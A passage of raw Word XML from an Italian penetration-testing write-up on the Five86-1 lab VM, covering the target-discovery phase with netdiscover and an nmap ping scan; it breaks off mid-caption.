        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00067544">
        <w:t>importanti</w:t>
      </w:r>
      <w:r>
        <w:t>, così come una certa esperienza con gli strumenti di test di penetrazione di base.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A8FA10" w14:textId="06699911" w:rsidR="00067544" w:rsidRDefault="00067544" w:rsidP="00067544">
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Five86-1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> è una </w:t>
      </w:r>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">VM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>VirtualBox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> costruita su </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Debian</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a 64 bit, ma non dovrebbero esserci problemi a eseguirla sulla maggior parte dei PC. Attualmente è configurato per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Bridged</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Networking</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, ma può essere modificato in base alle proprie esigenze. La rete è configurata per </w:t>
      </w:r>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>DHCP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Per altre informazioni visitare il </w:t>
      </w:r>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>link</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inserito in precedenza nel capitolo: Ambiente di Lavoro.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8F44EE" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="009644A6"/>
    <w:p w14:paraId="23BB9FFC" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="009644A6"/>
    <w:p w14:paraId="24DBD9AA" w14:textId="06EFD790" w:rsidR="009644A6" w:rsidRPr="00807495" w:rsidRDefault="00067544" w:rsidP="00067544">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc139378615"/>
      <w:r w:rsidRPr="00807495">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>5 Target Discovery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="37183CFF" w14:textId="77777777" w:rsidR="00B462C4" w:rsidRPr="00807495" w:rsidRDefault="00B462C4" w:rsidP="00B462C4"/>
    <w:p w14:paraId="57FC6AB9" w14:textId="4C8AFBAC" w:rsidR="00740CC9" w:rsidRDefault="00B462C4" w:rsidP="00740CC9">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B462C4">
        <w:t xml:space="preserve">Nella fase di </w:t>
      </w:r>
      <w:r w:rsidRPr="00B462C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Target Discovery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l’obiettivo è quello di rilevare le macchine attive e analizzarle </w:t>
      </w:r>
      <w:r w:rsidR="002801C7">
        <w:t>per</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> scoprire </w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t>il massimo numero di</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> informazioni, ad esempio possiamo capire il sistema operativo della macchina target tramite il </w:t>
      </w:r>
      <w:r w:rsidRPr="00B462C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">OS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B462C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>etc</w:t>
      </w:r>
      <w:r w:rsidR="002801C7" w:rsidRPr="002801C7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46323CE5" w14:textId="359EB01D" w:rsidR="00100D34" w:rsidRDefault="00B74592" w:rsidP="00740CC9">
      <w:r>
        <w:t>Prima di incominciare a cercare determinat</w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t>informazioni</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, andiamo a capire </w:t>
      </w:r>
      <w:r w:rsidR="005F5985">
        <w:t>qual è</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> l’indirizzo della macchina </w:t>
      </w:r>
      <w:r w:rsidR="005F5985">
        <w:t>target</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t xml:space="preserve"> sappiamo che il nostro indirizzo è </w:t>
      </w:r>
      <w:r w:rsidR="00100D34" w:rsidRPr="00100D34">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>10.0.2.15</w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t xml:space="preserve"> scoperto </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">tramite il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B74592">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42150312" w14:textId="298572CE" w:rsidR="008C343A" w:rsidRPr="008C343A" w:rsidRDefault="00740CC9" w:rsidP="00740CC9">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sapendo che dobbiamo individuare solo una macchina all’interno della nostra rete, possiamo effettuare una scansione per individuare l’indirizzo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> della macchina</w:t>
      </w:r>
      <w:r w:rsidR="00144B75">
        <w:t xml:space="preserve"> target. Per individuare tale informazione abbiamo effettuato una scansione tramite il </w:t>
      </w:r>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00144B75">
        <w:t xml:space="preserve"> che effettua</w:t>
      </w:r>
      <w:r w:rsidR="00100D34">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00144B75">
        <w:t xml:space="preserve">una scansione ARP passiva/attiva. Per completezza, viene mostrato anche l’utilizzo del </w:t>
      </w:r>
      <w:r w:rsidR="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00144B75">
        <w:t xml:space="preserve">che effettua una scansione </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t xml:space="preserve">basata sul </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144B75">
        <w:t>ping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00144B75">
        <w:t xml:space="preserve"> tramite il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00144B75" w:rsidRPr="00144B75">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.2.0/24</w:t>
      </w:r>
      <w:r w:rsidR="00E32D5A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="00E32D5A">
        <w:t>dove l’opzione -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="00E32D5A">
        <w:t xml:space="preserve"> permette di non effettuare un </w:t>
      </w:r>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">port </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>scan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="00E32D5A">
        <w:t xml:space="preserve"> a seguito </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>dell’host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>discovery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E32D5A" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:t xml:space="preserve">Vengono visualizzati anche altri indirizzi </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008C343A">
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008C343A">
        <w:t xml:space="preserve"> che riguardano gli elementi di configurazione di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008C343A" w:rsidRPr="008C343A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>VirtualBox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CB771D" w14:textId="584F4785" w:rsidR="00100D34" w:rsidRPr="00100D34" w:rsidRDefault="00100D34" w:rsidP="00740CC9">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Come detto in precedenza, verrà utilizzato sempre questo tipo d’approccio, </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>cioè,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> verranno utilizzati vari tool che </w:t>
      </w:r>
      <w:r w:rsidR="005D2BA2">
        <w:t>sono strutturati per lo stesso scopo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="005D2BA2">
        <w:t>se un tool non ri</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t xml:space="preserve">uscisse </w:t>
      </w:r>
      <w:r w:rsidR="005D2BA2">
        <w:t>a trovare informazioni</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005D2BA2">
        <w:t xml:space="preserve"> i successivi potrebbero riuscirci. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA19C6E" w14:textId="020744B7" w:rsidR="00B74592" w:rsidRPr="00E32D5A" w:rsidRDefault="00B74592" w:rsidP="00740CC9">
      <w:r>
        <w:t xml:space="preserve">Nelle due figure vengono analizzati gli output dei tool </w:t>
      </w:r>
      <w:r w:rsidR="005D2BA2">
        <w:t>citati</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in precedenza.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780EA9C1" w14:textId="77777777" w:rsidR="00067544" w:rsidRPr="00B462C4" w:rsidRDefault="00067544" w:rsidP="00067544"/>
    <w:p w14:paraId="45FE7601" w14:textId="3E34626D" w:rsidR="00B74592" w:rsidRPr="002801C7" w:rsidRDefault="002801C7" w:rsidP="002801C7">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251667456" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7FC631AC" wp14:editId="6C15CF95">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>19050</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>692150</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="590550" cy="146050"/>
                <wp:effectExtent l="0" t="0" r="19050" b="25400"/>
                <wp:wrapNone/>
                <wp:docPr id="910535857" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="590550" cy="146050"/>
                        </a:xfrm>
                        <a:prstGeom prst="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65A4B30F" w14:textId="77777777" w:rsidR="002801C7" w:rsidRDefault="002801C7" w:rsidP="002801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631AC" id="Rettangolo 3" o:spid="_x0000_s1027" style="position:absolute;left:0;text-align:left;margin-left:1.5pt;margin-top:54.5pt;width:46.5pt;height:1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D5ScwIAAEkFAAAOAAAAZHJzL2Uyb0RvYy54bWysVN1v0zAQf0fif7D8zpJU7WDV0qlsKkKa&#10;tokN7dl17DbC8Zmz27T89ZydNC2jT4iX5L5+932+vtk1hm0V+hpsyYuLnDNlJVS1XZX8+8viwyfO&#10;fBC2EgasKvleeX4ze//uunVTNYI1mEohIyfWT1tX8nUIbpplXq5VI/wFOGVJqQEbEYjFVVahaMl7&#10;Y7JRnl9mLWDlEKTynqR3nZLPkn+tlQyPWnsVmCk55RbSF9N3Gb/Z7FpMVyjcupZ9GuIfsmhEbSno&#10;4OpOBME2WP/lqqklggcdLiQ0GWhdS5VqoGqK/E01z2vhVKqFmuPd0Cb//9zKh+2ze0JqQ+v81BMZ&#10;q9hpbOKf8mO71Kz90Cy1C0yScHKVTybUUkmqYnyZE01esiPYoQ9fFDQsEiVHmkVqkdje+9CZHkxi&#10;LAuL2pg0D2OjwIOpqyhLDK6WtwbZVsRB5p/zxSHciRkFj9DsWEqiwt6o6MPYb0qzuqLkRymTtGVq&#10;cCukVDZc9mUk6wjTlMIALM4BTSh6UG8bYSpt3wDMzwH/jDggUlSwYQA3tQU856D6MUTu7A/VdzXH&#10;8sNuuaOiaUgxxyhZQrV/QobQXYN3clHTiO6FD08Caf1pqnTS4ZE+2kBbcugpztaAv87Joz1tJWk5&#10;a+mcSu5/bgQqzsxXS/t6VYzH8f4SM558HBGDp5rlqcZumlugQRf0eDiZyGgfzIHUCM0rXf48RiWV&#10;sJJil1wGPDC3oTtzejukms+TGd2cE+HePjsZncc+xxV82b0KdP2eBlrwBzicnpi+WdfONiItzDcB&#10;dJ12+djXfgJ0r+ka+rclPginfLI6voCz3wAAAP//AwBQSwMEFAAGAAgAAAAhAIHSUMzbAAAACAEA&#10;AA8AAABkcnMvZG93bnJldi54bWxMT01rwzAMvQ/6H4wGu632GihNGqeMwmCHDra2P8CN1SQslkOs&#10;tum/n3baTpLeE++j3EyhV1ccUxfJwsvcgEKqo++osXA8vD2vQCV25F0fCS3cMcGmmj2UrvDxRl94&#10;3XOjRIRS4Sy0zEOhdapbDC7N44Ak3DmOwbGcY6P96G4iHnq9MGapg+tIHFo34LbF+nt/CRbCrs5H&#10;fm+y42e2uu+6A+tz+LD26XF6XYNinPjvGX7jS3SoJNMpXsgn1VvIpAkLbHJZhM+XMk8CZAsDuir1&#10;/wLVDwAAAP//AwBQSwECLQAUAAYACAAAACEAtoM4kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAA&#10;W0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAIAAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAA&#10;AAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAIAAAAIQBI9D5ScwIAAEkFAAAOAAAAAAAAAAAA&#10;AAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQABgAIAAAAIQCB0lDM2wAAAAgBAAAPAAAAAAAA&#10;AAAAAAAAAM0EAABkcnMvZG93bnJldi54bWxQSwUGAAAAAAQABADzAAAA1QUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="65A4B30F" w14:textId="77777777" w:rsidR="002801C7" w:rsidRDefault="002801C7" w:rsidP="002801C7">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00807495" w:rsidRPr="00807495">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2AAC00DA" wp14:editId="640E8AE9">
            <wp:extent cx="5274310" cy="1189355"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="6279930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3087" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1189355"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00B74592" w:rsidRPr="00B74592">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 2: ARP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B74592" w:rsidRPr="00B74592">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>scan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="59584D4C" w14:textId="09CFCF6B" w:rsidR="00B74592" w:rsidRDefault="00B74592" w:rsidP="00B74592"/>
    <w:p w14:paraId="56931605" w14:textId="1F3D1F8C" w:rsidR="00B74592" w:rsidRDefault="009F7BF3" w:rsidP="009F7BF3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3230"/>
        </w:tabs>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="021FE14D" wp14:editId="0A805198">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1487805</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1873250" cy="133350"/>
                <wp:effectExtent l="0" t="0" r="12700" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="1307330793" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1873250" cy="133350"/>
                        </a:xfrm>
                        <a:prstGeom prst="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25744B5" w14:textId="77777777" w:rsidR="002801C7" w:rsidRDefault="002801C7" w:rsidP="002801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FE14D" id="_x0000_s1028" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:117.15pt;width:147.5pt;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wVedwIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X20nfS2oU2QtMgwo&#10;2mLt0LMiS4kxWdQoJXH260vJjpt1OQ272JTIj+THh66u28awjUJfgy15cZJzpqyEqrbLkv94nn+6&#10;5MwHYSthwKqS75Tn19OPH662bqJGsAJTKWTkxPrJ1pV8FYKbZJmXK9UIfwJOWVJqwEYEOuIyq1Bs&#10;yXtjslGen2dbwMohSOU93d52Sj5N/rVWMjxo7VVgpuSUW0hfTN9F/GbTKzFZonCrWvZpiH/IohG1&#10;paCDq1sRBFtj/ZerppYIHnQ4kdBkoHUtVeJAbIr8HZunlXAqcaHieDeUyf8/t/J+8+QekcqwdX7i&#10;SYwsWo1N/FN+rE3F2g3FUm1gki6Ly4vx6IxqKklXjMdjkslN9oZ26MNXBQ2LQsmRmpFqJDZ3PnSm&#10;e5MYzMK8NiY1xNh44cHUVbxLB1wubgyyjYidzL/k8324AzMKHqHZG5ckhZ1R0Yex35VmdUXZj1Im&#10;aczU4FZIqWw472kk6wjTlMIALI4BTSh6UG8bYSqN3wDMjwH/jDggUlSwYQA3tQU85qD6OUTu7Pfs&#10;O86RfmgXLZGOnPs2L6DaPSJD6NbBOzmvqUV3wodHgTT/1FXa6fBAH21gW3LoJc5WgL+P3Ud7GkvS&#10;cralfSq5/7UWqDgz3ywN7Ofi9DQuYDqcnl2M6ICHmsWhxq6bG6BGF/R6OJnEaB/MXtQIzQut/ixG&#10;JZWwkmKXXAbcH25Ct+f0eEg1myUzWjonwp19cjI6j3WOI/jcvgh0/ZwGmvB72O+emLwb1842Ii3M&#10;1gF0nWY5Vrqra98BWti0Df3jEl+Ew3OyensCp68AAAD//wMAUEsDBBQABgAIAAAAIQBX9JZU3gAA&#10;AAgBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/NTsMwEITvSLyDtUjcqNOYoDbEqRASEoci0Z8HcGM3&#10;iRqvI3vbpm/PcoLb7s5o9ptqNflBXFxMfUAN81kGwmETbI+thv3u42kBIpFBa4aATsPNJVjV93eV&#10;KW244sZdttQKDsFUGg0d0VhKmZrOeZNmYXTI2jFEb4jX2EobzZXD/SDzLHuR3vTIHzozuvfONaft&#10;2Wvw62YZ6bNV+2+1uK37Hcmj/9L68WF6ewVBbqI/M/ziMzrUzHQIZ7RJDBq4CGnI1bMCwXK+LPhy&#10;4KEoFMi6kv8L1D8AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+AAAA4QEAABMAAAAAAAAAAAAA&#10;AAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAAACEAOP0h/9YAAACUAQAACwAA&#10;AAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAAACEAuZ8FXncCAABKBQAADgAA&#10;AAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYACAAAACEAV/SWVN4AAAAIAQAA&#10;DwAAAAAAAAAAAAAAAADRBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAAAAAEAAQA8wAAANwFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="725744B5" w14:textId="77777777" w:rsidR="002801C7" w:rsidRDefault="002801C7" w:rsidP="002801C7">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00384A0C" w:rsidRPr="00384A0C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="432B4A78" wp14:editId="0CCFFB39">
            <wp:extent cx="5274310" cy="2302510"/>
            <wp:effectExtent l="0" t="0" r="2540" b="2540"/>
            <wp:docPr id="18438903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90384" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2302510"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="009F7BF3">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 3: Ping </w:t>
      </w:r>
